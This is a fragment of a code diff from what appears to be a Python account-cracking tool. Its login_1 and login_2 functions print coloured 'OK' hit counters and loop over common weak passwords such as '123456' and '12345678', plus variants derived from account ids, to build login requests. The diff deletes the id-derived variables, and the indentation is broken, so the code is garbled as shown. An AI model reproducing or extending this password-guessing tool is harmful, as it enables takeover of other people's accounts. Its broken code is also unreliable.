@@ -369,12 +369,10 @@ def login_1(uid):
     try:
         sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDANO-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
-        first6 = id[:6]
-fullnumber = id
-last6 = id[-6:]
+        
 
 for pw in ('123456', '1234567', '12345678', '123456789', 'first6', 'fullnumber', 'last6'):
-    # aapka baki code
+    
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -433,9 +431,7 @@ for pw in ('123456', '1234567', '12345678', '123456789', 'first6', 'fullnumber',
 
 def login_2(uid):
     sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDANO-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
-    first6 = id[:6]
-fullnumber = id
-last6 = id[-6:]
+    
 
 for pw in ('123456', '1234567', '12345678', '123456789', 'first6', 'fullnumber', 'last6'):
         try:
